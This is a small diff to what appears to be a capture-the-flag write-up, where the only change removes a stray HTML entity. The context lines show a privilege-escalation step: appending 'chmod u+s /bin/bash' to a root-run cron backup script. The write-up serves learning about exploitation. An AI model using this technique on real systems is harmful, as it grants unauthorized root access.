@@ -84,7 +84,7 @@ It seems that we own a script or something. Since this is within the system's PA
 zip -r website.bak.zip /var/www/html && mv website.bak.zip /root/backup.zip
 ```
 
-This looks like something that the `root` user would have on a cronjob. As such, we can just append `chmod u+s /bin/bash` to the script.&#x20;
+This looks like something that the `root` user would have on a cronjob. As such, we can just append `chmod u+s /bin/bash` to the script.
 
 ```bash
 pericles@time:/usr/bin$ echo 'chmod u+s /bin/bash' >> timer_backup.sh
